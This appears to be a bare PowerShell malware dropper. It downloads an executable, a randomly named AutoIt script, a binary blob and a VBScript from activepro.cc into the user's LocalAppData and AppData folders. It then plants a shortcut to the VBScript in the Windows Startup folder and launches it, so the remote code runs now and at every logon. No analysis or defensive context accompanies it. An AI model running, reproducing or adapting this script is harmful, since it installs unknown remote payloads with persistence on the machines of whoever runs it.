$l=$env:LOCALAPPDATA;$r=$env:APPDATA
iwr http://activepro.cc/v2/task.exe -OutFile "$l\task.exe"
iwr http://activepro.cc/v2/SDiRCVBwkOKgzkiWZATZw.au3 -OutFile "$l\SDiRCVBwkOKgzkiWZATZw.au3"
iwr http://activepro.cc/v2/xmPrzXvXVZUROtHRABGChwqfdoqv.bin -OutFile "$l\xmPrzXvXVZUROtHRABGChwqfdoqv.bin"
$f="$r\task.vbs";iwr http://activepro.cc/v2/task.vbs -OutFile $f
$s="$([Environment]::GetFolderPath('Startup'))\task.lnk"
$w=New-Object -Com WScript.Shell;$c=$w.CreateShortcut($s)
$c.TargetPath=$f;$c.Save();Start-Process $s